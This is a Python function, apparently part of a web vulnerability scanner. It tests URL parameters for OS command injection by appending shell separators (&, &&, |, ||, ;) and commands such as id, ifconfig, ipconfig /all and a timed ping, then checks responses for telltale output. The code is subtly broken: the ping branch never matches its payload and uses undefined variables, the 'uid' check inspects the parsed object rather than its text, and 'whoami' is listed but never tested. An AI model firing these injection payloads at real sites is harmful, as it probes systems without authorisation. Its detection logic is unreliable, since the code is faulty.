import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import sys

def Cmdinjection(urll,s,param):
	payloads=["whoami","id","ifconfig","ipconfig /all","ping+-c+10+127.0.0.1",]
	adds=["&","&&","|","||",";"]
	def injection(u):
		craftedurl=u[0]+"="+u[1]
		for i in payloads:
			if i=="id":
				for j in adds:
					inj=craftedurl+j+i
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					if "uid" in soup:
						print(inj+"command injection found")
					inj=craftedurl+j+i+j
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					if "uid" in soup:
						print(inj+"command injection found")
			if i=="ifconfig":
				for j in adds:
					inj=craftedurl+j+i
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					sou=str(soup)
					found = re.search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",sou)
					if found:
						print(inj+"command injection found")
					inj=craftedurl+j+i+j
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					sou=str(soup)
					found = re.search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",sou)
					if found:
						print(inj+"command injection found")
			if i=="ipconfig /all":
				for j in adds:
					inj=craftedurl+j+i
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					sou=str(soup)
					found = re.search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",sou)
					if found:
						print(inj+"command injection found")
					inj=craftedurl+j+i+j
					response = s.get(inj)
					soup = BeautifulSoup(response.content, 'html.parser')
					sou=str(soup)
					found = re.search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",sou)
					if found:
						print(inj+"command injection found")
			if i=="ping -c 10 127.0.0.1":
				for j in adds:
					inj=craftedurl+j+i
					response = s.get(inj)
					times=response.elapsed
					strtime=str(m)
					resu = strtime.split(":")
					vals=float(x[2])
					if(vals>10):
						print(inj+"command injection found")
					inj=craftedurl+j+i+j
					response = s.get(inj)
					times=response.elapsed
					strtime=str(m)
					resu = strtime.split(":")
					vals=float(x[2])
					if(vals>10):
						print(inj+"command injection found")
		
				

	def initial(parameter):
		x = parameter.split("=")
		m=len(x)
		if m==2:
			injection(x)
	

	cmdiniit=param
	for i in param:
		initial(i)

